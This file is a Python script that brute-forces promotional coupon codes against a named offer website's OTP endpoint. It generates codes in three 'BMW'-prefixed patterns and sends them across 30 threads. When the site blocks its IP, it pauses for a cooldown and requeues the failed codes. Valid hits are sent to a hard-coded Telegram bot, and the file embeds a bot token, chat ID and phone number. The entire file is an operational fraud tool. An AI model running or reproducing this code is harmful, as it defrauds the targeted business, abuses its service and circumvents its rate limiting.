#!/usr/bin/env python3

import requests
import concurrent.futures
import time
import random
import string
import threading
from threading import Lock
from datetime import datetime
import sys
import os
from collections import deque

# ================== ✅ BOT TOKEN AND CHAT ID ==================
TELEGRAM_BOT_TOKEN = "8980517962:AAFPLcjVCTGAZ3OL9iLaSSpqJejMT7I44wI" #enter  your telegram bot token
TELEGRAM_CHAT_ID = "6420941417" #enter  your telegram chat id
# =========================================================================

# ================== CHARACTER SETS ==================
# Letters - EXCLUDED: I, L, O, Q, S, W, Z
ALLOWED_LETTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'M', 'N', 'P', 'R', 'T', 'U', 'V', 'X', 'Y']
# Digits - EXCLUDED: 0, 1, 5
ALLOWED_DIGITS = ['2', '3', '4', '6', '7', '8', '9']
# Alphanumeric for pattern 3 (combination of allowed letters and digits)
ALLOWED_ALPHANUMERIC = ALLOWED_LETTERS + ALLOWED_DIGITS

# ================== COLOR CODES ==================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    BG_GREEN = '\033[42m'
    BG_RED = '\033[41m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BLACK = '\033[30m'
    RESET = '\033[0m'

def print_banner():
    print(f"""
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║                                                                                      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║   {Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW} █████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW} ███{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗   {Colors.YELLOW}███{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW} ██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗      {Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗  {Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW} ████████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW} ███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔════╝{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗ {Colors.YELLOW}████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔═══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔═══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗  {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔════╝{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔════╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔╝{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}█████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗  {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}█████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗  {Colors.YELLOW}███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║╚{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔╝{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══╝  {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔══╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║   {Colors.YELLOW}╚██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║  {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║ ╚═╝ {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}╚██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔╝{Colors.YELLOW}╚██████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╔╝   {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║   {Colors.YELLOW}███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╗{Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║     {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║  {Colors.YELLOW}██{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.YELLOW}███████{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║    {Colors.YELLOW}╚═════╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     {Colors.YELLOW}╚═════╝ {Colors.YELLOW}╚═════╝ {Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}    ╚═╝   {Colors.YELLOW}╚══════╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}╚═╝     ╚═╝  ╚═╝{Colors.YELLOW}╚══════╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║                                                                                      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║         {Colors.GREEN}╔════════════════════════════════════════════════════════════╗{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║         {Colors.GREEN}║     SCRIPT CODED BY - blank                      ║{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║         {Colors.GREEN}║        OWNER - blank                                    ║{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║         {Colors.GREEN}         ║{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}║         {Colors.GREEN}╚════════════════════════════════════════════════════════════╝{Colors.RESET}{Colors.BG_MAGENTA}{Colors.WHITE}      ║{Colors.RESET}
{Colors.BG_MAGENTA}{Colors.BOLD}{Colors.WHITE}╚══════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)

# ================== CONFIGURATION ==================
ENABLE_TELEGRAM = True
CHANNEL_LINK = "https://t.me/+QcZIhxFxn-oyNDI1"
BASE_URL = "https://grainotch.theofferclub.in/"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "8210327659" #enter mobile number
MAX_WORKERS = 30
COOLDOWN_SECONDS = 90
BATCH_SIZE = 300
RECHECK_INTERVAL = 2

# Files
VALID_CODES_FILE = "valid_codes.txt"
WRONG_CODES_FILE = "wrong_codes.txt"
CHECKED_CODES_FILE = "checked_codes.txt"

# Storage
wrong_codes = set()
wrong_lock = Lock()
checked_codes = set()
checked_lock = Lock()

# Recheck Queue
recheck_queue = deque()
recheck_lock = Lock()
recheck_stats = {'total': 0, 'resolved_valid': 0, 'resolved_wrong': 0, 'still_pending': 0}

# Stats
stats = {'total_checked': 0, 'valid': 0, 'wrong': 0, 'errors': 0, 'ip_blocks': 0, 'start_time': time.time()}
stats_lock = Lock()

# Cooldown
cooldown_active = False
cooldown_end_time = 0
cooldown_lock = Lock()

# Pattern selection (1, 2, or 3)
CURRENT_PATTERN = 1

# ================== 3 PATTERNS ==================
def generate_pattern1():
    """Pattern 1: BMW + 3 DIGITS + 4 LETTERS"""
    prefix = "BMW"
    digits = ''.join(random.choices(ALLOWED_DIGITS, k=3))
    letters = ''.join(random.choices(ALLOWED_LETTERS, k=4))
    return f"{prefix}{digits}{letters}"

def generate_pattern2():
    """
    Pattern 2: BMW + L + D + L + L + D + L + D
    Example: BMWA2BC3D4
    """
    prefix = "BMW"
    p1 = random.choice(ALLOWED_LETTERS)
    p2 = random.choice(ALLOWED_DIGITS)
    p3 = random.choice(ALLOWED_LETTERS)
    p4 = random.choice(ALLOWED_LETTERS)
    p5 = random.choice(ALLOWED_DIGITS)
    p6 = random.choice(ALLOWED_LETTERS)
    p7 = random.choice(ALLOWED_DIGITS)
    return f"{prefix}{p1}{p2}{p3}{p4}{p5}{p6}{p7}"

def generate_pattern3():
    """
    Pattern 3: BMW + 7 ALPHANUMERIC (A-Z, 0-9)
    Using only allowed letters and digits
    Example: BMWA1B2C3D
    """
    prefix = "BMW"
    alphanumeric = ''.join(random.choices(ALLOWED_ALPHANUMERIC, k=7))
    return f"{prefix}{alphanumeric}"

def generate_random_code():
    """Generate code cycling through patterns 1, 2, and 3"""
    global CURRENT_PATTERN
    CURRENT_PATTERN = (CURRENT_PATTERN % 3) + 1
    
    if CURRENT_PATTERN == 1:
        code = generate_pattern1()
    elif CURRENT_PATTERN == 2:
        code = generate_pattern2()
    else:
        code = generate_pattern3()
    
    # Check if already used
    if not is_code_checked(code) and not is_code_wrong(code):
        return code
    else:
        # Retry with different combinations
        for _ in range(100):
            if CURRENT_PATTERN == 1:
                code = generate_pattern1()
            elif CURRENT_PATTERN == 2:
                code = generate_pattern2()
            else:
                code = generate_pattern3()
            if not is_code_checked(code) and not is_code_wrong(code):
                return code
    
    # Fallback
    if CURRENT_PATTERN == 1:
        return generate_pattern1()
    elif CURRENT_PATTERN == 2:
        return generate_pattern2()
    else:
        return generate_pattern3()

# ================== TELEGRAM ==================
telegram_start_sent = False

def send_telegram_start():
    global telegram_start_sent
    if not ENABLE_TELEGRAM or telegram_start_sent:
        return
    
    telegram_start_sent = True
    def send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            message = f"""🚀 BMW CHECKER STARTED!

🔥 CHANNEL: {CHANNEL_LINK}
👑 OWNER: blank
💻 CODED BY: blank

━━━━━━━━━━━━━━━━━━━━━
📝 3 PATTERNS:

🔹 PATTERN 1: BMW + 3 DIGITS + 4 LETTERS
   Example: BMW234ABCD

🔹 PATTERN 2: BMW + L/D/L/L/D/L/D
   Example: BMWA2BC3D4

🔹 PATTERN 3: BMW + 7 ALPHANUMERIC
   Example: BMWA1B2C3D

✅ ALLOWED LETTERS: A,B,C,D,E,F,G,H,J,K,M,N,P,R,T,U,V,X,Y
❌ EXCLUDED: I,L,O,Q,S,W,Z

✅ ALLOWED DIGITS: 2,3,4,6,7,8,9
❌ EXCLUDED: 0,1,5

⏱️ Cooldown: 90 seconds
📱 Mobile: {TEST_MOBILE}
🔄 Auto Recheck: Every 2 batches
━━━━━━━━━━━━━━━━━━━━━"""
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except:
            pass
    threading.Thread(target=send, daemon=True).start()

def send_valid_alert(code, mobile, is_retry=False):
    if not ENABLE_TELEGRAM:
        return
    
    retry_tag = " 🔄 (RESOLVED)" if is_retry else ""
    def send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            message = f"""🎉 VALID CODE FOUND!{retry_tag}
    
🔑 CODE: {code}
📱 MOBILE: {mobile}
🏷️ 

━━━━━━━━━━━━━━━━━━━━━
🔥 CHANNEL: {CHANNEL_LINK}
━━━━━━━━━━━━━━━━━━━━━"""
            data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
            requests.post(url, data=data, timeout=10)
        except:
            pass
    threading.Thread(target=send, daemon=True).start()

# ================== RECHECK FUNCTIONS ==================
def add_to_recheck_queue(code, error_type, message):
    with recheck_lock:
        for item in recheck_queue:
            if item['code'] == code:
                return
        recheck_queue.append({
            'code': code,
            'error_type': error_type,
            'message': message,
            'retry_count': 0,
            'added_time': time.time()
        })
        recheck_stats['total'] += 1
        print(f"   {Colors.YELLOW}📝 Added to recheck queue: {code} ({error_type}){Colors.RESET}")

def get_recheck_count():
    with recheck_lock:
        return len(recheck_queue)

def has_pending_rechecks():
    with recheck_lock:
        return len(recheck_queue) > 0

def check_code_for_recheck(code):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {"phone": TEST_MOBILE, "ccode": code}
    
    try:
        resp = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        
        if resp.status_code in [403, 429]:
            return {'valid': False, 'type': 'ip_block', 'code': code, 'msg': 'IP BLOCKED'}
        
        if resp.status_code == 200:
            try:
                j = resp.json()
                if j.get('status') == 'success':
                    save_checked_code(code)
                    return {'valid': True, 'type': 'valid', 'code': code, 'msg': 'VALID'}
                else:
                    save_wrong_code(code)
                    save_checked_code(code)
                    return {'valid': False, 'type': 'wrong', 'code': code, 'msg': 'INVALID'}
            except:
                save_wrong_code(code)
                save_checked_code(code)
                return {'valid': False, 'type': 'wrong', 'code': code, 'msg': 'INVALID'}
        else:
            return {'valid': False, 'type': 'error', 'code': code, 'msg': f'HTTP {resp.status_code}'}
    except:
        return {'valid': False, 'type': 'error', 'code': code, 'msg': 'ERROR'}

def recheck_pending_codes():
    if not has_pending_rechecks():
        return
    
    recheck_count = get_recheck_count()
    if recheck_count == 0:
        return
    
    print(f"\n{Colors.BG_BLUE}{Colors.BOLD}{Colors.WHITE}🔄 RECHECKING {recheck_count} PENDING CODES...{Colors.RESET}")
    
    items_to_recheck = []
    with recheck_lock:
        while recheck_queue:
            items_to_recheck.append(recheck_queue.popleft())
    
    resolved_valid = 0
    resolved_wrong = 0
    still_error = 0
    
    def recheck_single(item):
        nonlocal resolved_valid, resolved_wrong, still_error
        code = item['code']
        
        print(f"   🔄 Rechecking: {code}...", end=" ")
        
        result = check_code_for_recheck(code)
        
        if result['valid']:
            resolved_valid += 1
            recheck_stats['resolved_valid'] += 1
            print(f"{Colors.GREEN}✅ VALID!{Colors.RESET}")
            with open(VALID_CODES_FILE, "a") as f:
                f.write(f"{result['code']} | {TEST_MOBILE} | {datetime.now()} [RESOLVED]\n")
            send_valid_alert(result['code'], TEST_MOBILE, is_retry=True)
            return {'code': code, 'resolved': True, 'type': 'valid'}
        elif result['type'] == 'wrong':
            resolved_wrong += 1
            recheck_stats['resolved_wrong'] += 1
            print(f"{Colors.RED}❌ INVALID{Colors.RESET}")
            return {'code': code, 'resolved': True, 'type': 'wrong'}
        else:
            still_error += 1
            recheck_stats['still_pending'] += 1
            print(f"{Colors.YELLOW}⚠️ STILL ERROR - Will retry later{Colors.RESET}")
            return {'code': code, 'resolved': False, 'type': result['type'], 'message': result['msg']}
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(recheck_single, item) for item in items_to_recheck]
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except:
                pass
    
    for result in results:
        if not result['resolved']:
            with recheck_lock:
                recheck_queue.append({
                    'code': result['code'],
                    'error_type': result['type'],
                    'message': result.get('message', ''),
                    'retry_count': 0,
                    'added_time': time.time()
                })
    
    print(f"\n{Colors.GREEN}✅ RECHECK COMPLETE! Valid: {resolved_valid} | Wrong: {resolved_wrong} | Still: {still_error}{Colors.RESET}")
    print(f"   {Colors.CYAN}📋 Queue: {get_recheck_count()}{Colors.RESET}")

# ================== COOLDOWN ==================
def start_cooldown(reason):
    global cooldown_active, cooldown_end_time
    with cooldown_lock:
        if not cooldown_active:
            cooldown_active = True
            cooldown_end_time = time.time() + COOLDOWN_SECONDS
            print(f"\n{Colors.BG_YELLOW}{Colors.BOLD}{Colors.BLACK}🔥 COOLDOWN: {reason} - {COOLDOWN_SECONDS}s{Colors.RESET}")

def is_cooldown():
    global cooldown_active, cooldown_end_time
    with cooldown_lock:
        if cooldown_active:
            remaining = cooldown_end_time - time.time()
            if remaining > 0:
                return True
            else:
                cooldown_active = False
                print(f"\n{Colors.BG_GREEN}{Colors.BOLD}{Colors.BLACK}✅ Cooldown finished!{Colors.RESET}")
                return False
    return False

def wait_cooldown():
    while is_cooldown():
        with cooldown_lock:
            remaining = cooldown_end_time - time.time()
        if remaining > 0:
            print(f"{Colors.YELLOW}⏸️ Cooldown: {remaining:.0f}s...{Colors.RESET}", end="\r")
            time.sleep(0.5)
    print(" " * 30, end="\r")

# ================== FILE FUNCTIONS ==================
def load_checked_codes():
    global checked_codes
    if os.path.exists(CHECKED_CODES_FILE):
        try:
            with open(CHECKED_CODES_FILE, 'r') as f:
                for line in f:
                    code = line.strip()
                    if code:
                        checked_codes.add(code)
            print(f"{Colors.CYAN}📂 Loaded {len(checked_codes)} checked codes{Colors.RESET}")
        except:
            pass

def save_checked_code(code):
    with checked_lock:
        if code not in checked_codes:
            checked_codes.add(code)
            with open(CHECKED_CODES_FILE, 'a') as f:
                f.write(f"{code}\n")

def is_code_checked(code):
    with checked_lock:
        return code in checked_codes

def load_wrong_codes():
    global wrong_codes
    if os.path.exists(WRONG_CODES_FILE):
        try:
            with open(WRONG_CODES_FILE, 'r') as f:
                for line in f:
                    code = line.strip()
                    if code:
                        wrong_codes.add(code)
            print(f"{Colors.CYAN}📂 Loaded {len(wrong_codes)} wrong codes{Colors.RESET}")
        except:
            pass

def save_wrong_code(code):
    with wrong_lock:
        if code not in wrong_codes:
            wrong_codes.add(code)
            with open(WRONG_CODES_FILE, 'a') as f:
                f.write(f"{code}\n")

def is_code_wrong(code):
    with wrong_lock:
        return code in wrong_codes

# ================== BATCH GENERATION ==================
def generate_batch(batch_size):
    codes = []
    seen = set()
    attempts = 0
    max_attempts = batch_size * 3
    
    while len(codes) < batch_size and attempts < max_attempts:
        code = generate_random_code()
        if code not in seen and not is_code_checked(code) and not is_code_wrong(code):
            seen.add(code)
            codes.append(code)
            save_checked_code(code)
        attempts += 1
    
    return codes

# ================== CHECK CODE ==================
def check_code(code):
    if is_cooldown():
        wait_cooldown()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
    }
    data = {"phone": TEST_MOBILE, "ccode": code}
    start_time = time.time()
    
    try:
        resp = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        resp_time = round((time.time() - start_time) * 1000, 2)
        
        if resp.status_code in [403, 429]:
            start_cooldown(f"IP BLOCK (HTTP {resp.status_code})")
            with stats_lock:
                stats['ip_blocks'] += 1
            add_to_recheck_queue(code, "ip_block", f"HTTP {resp.status_code}")
            return {'valid': False, 'type': 'ip_block', 'code': code, 'msg': '🚫 IP BLOCKED', 'time': resp_time}
        
        if resp.status_code == 200:
            try:
                j = resp.json()
                if j.get('status') == 'success':
                    save_checked_code(code)
                    return {'valid': True, 'type': 'valid', 'code': code, 'msg': '✅ VALID', 'time': resp_time}
                else:
                    save_wrong_code(code)
                    save_checked_code(code)
                    return {'valid': False, 'type': 'wrong', 'code': code, 'msg': '❌ INVALID', 'time': resp_time}
            except:
                save_wrong_code(code)
                save_checked_code(code)
                return {'valid': False, 'type': 'wrong', 'code': code, 'msg': '❌ INVALID', 'time': resp_time}
        else:
            add_to_recheck_queue(code, "error", f"HTTP {resp.status_code}")
            return {'valid': False, 'type': 'error', 'code': code, 'msg': f'❌ HTTP {resp.status_code}', 'time': resp_time}
    except Exception as e:
        add_to_recheck_queue(code, "error", str(e)[:30])
        return {'valid': False, 'type': 'error', 'code': code, 'msg': '❌ ERROR', 'time': 0}

# ================== PROCESS CODE ==================
print_lock = Lock()

def process_code(code):
    result = check_code(code)
    
    with stats_lock:
        stats['total_checked'] += 1
        if result['type'] == 'valid':
            stats['valid'] += 1
        elif result['type'] == 'wrong':
            stats['wrong'] += 1
        else:
            stats['errors'] += 1
        
        total = stats['total_checked']
        valid = stats['valid']
        wrong = stats['wrong']
        errors = stats['errors']
        ip_blocks = stats['ip_blocks']
    
    with print_lock:
        if result['valid']:
            print(f"\n{Colors.BG_GREEN}{Colors.BOLD}{Colors.BLACK}🎉 VALID: {result['code']} 🎉{Colors.RESET}")
            print(f"{Colors.MAGENTA}{Colors.RESET}\n")
            with open(VALID_CODES_FILE, "a") as f:
                f.write(f"{result['code']} | {TEST_MOBILE} | {datetime.now()}\n")
            send_valid_alert(result['code'], TEST_MOBILE, is_retry=False)
            icon = f"{Colors.GREEN}🎯{Colors.RESET}"
            msg_color = f"{Colors.GREEN}{result['msg']}{Colors.RESET}"
        elif result['type'] == 'wrong':
            icon = f"{Colors.RED}❌{Colors.RESET}"
            msg_color = f"{Colors.RED}{result['msg']}{Colors.RESET}"
        elif result['type'] == 'ip_block':
            icon = f"{Colors.YELLOW}🚫{Colors.RESET}"
            msg_color = f"{Colors.YELLOW}{result['msg']}{Colors.RESET}"
        else:
            icon = f"{Colors.MAGENTA}⚠️{Colors.RESET}"
            msg_color = f"{Colors.MAGENTA}{result['msg']}{Colors.RESET}"
        
        print(f"{icon} #{total} | {Colors.WHITE}{result['code']}{Colors.RESET} | {msg_color} ({result['time']}ms) | {Colors.GREEN}V:{valid}{Colors.RESET} {Colors.RED}W:{wrong}{Colors.RESET} {Colors.MAGENTA}E:{errors}{Colors.RESET} {Colors.YELLOW}IPB:{ip_blocks}{Colors.RESET} | {Colors.CYAN}Q:{get_recheck_count()}{Colors.RESET}")
    
    return result

# ================== MAIN ==================
def main():
    print_banner()
    
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}🚀 BMW 3 PATTERN CHECKER{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"📱 Mobile: {Colors.GREEN}{TEST_MOBILE}{Colors.RESET}")
    print(f"⚡ Workers: {Colors.YELLOW}{MAX_WORKERS}{Colors.RESET}")
    print(f"🔥 Cooldown: {Colors.YELLOW}{COOLDOWN_SECONDS}s{Colors.RESET}")
    print(f"🔄 Auto Recheck: {Colors.GREEN}Every {RECHECK_INTERVAL} batches{Colors.RESET}")
    print(f"🔗 Channel: {Colors.CYAN}{CHANNEL_LINK}{Colors.RESET}")
    print(f"\n{Colors.CYAN}📝 3 PATTERNS (Cycling):{Colors.RESET}")
    print(f"   {Colors.GREEN}1️⃣ BMW + 3 DIGITS + 4 LETTERS{Colors.RESET}")
    print(f"      Example: BMW234ABCD")
    print(f"   {Colors.GREEN}2️⃣ BMW + L/D/L/L/D/L/D{Colors.RESET}")
    print(f"      Example: BMWA2BC3D4")
    print(f"   {Colors.GREEN}3️⃣ BMW + 7 ALPHANUMERIC{Colors.RESET}")
    print(f"      Example: BMWA1B2C3D")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    send_telegram_start()
    
    load_checked_codes()
    load_wrong_codes()
    
    start_time = time.time()
    batch_num = 1
    
    try:
        while True:
            print(f"\n{Colors.BG_BLUE}{Colors.BOLD}{Colors.WHITE}📦 BATCH #{batch_num} - Generating {BATCH_SIZE} codes{Colors.RESET}")
            codes = generate_batch(BATCH_SIZE)
            
            if not codes:
                print(f"{Colors.RED}⚠️ No more unique codes!{Colors.RESET}")
                break
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                futures = [executor.submit(process_code, code) for code in codes]
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except:
                        pass
            
            if batch_num % RECHECK_INTERVAL == 0 or has_pending_rechecks():
                recheck_pending_codes()
            
            elapsed = time.time() - start_time
            with stats_lock:
                speed = stats['total_checked'] / elapsed if elapsed > 0 else 0
                print(f"\n{Colors.CYAN}📊 BATCH #{batch_num} COMPLETE | Total: {stats['total_checked']} | Valid: {stats['valid']} | Speed: {speed:.1f}/sec | Queue: {get_recheck_count()}{Colors.RESET}")
            
            batch_num += 1
            time.sleep(1)
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}🛑 Stopped by user!{Colors.RESET}")
    
    elapsed = time.time() - start_time
    print(f"\n{Colors.BG_GREEN}{Colors.BOLD}{Colors.BLACK}📊 FINAL SUMMARY{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"Time: {elapsed/60:.1f} min")
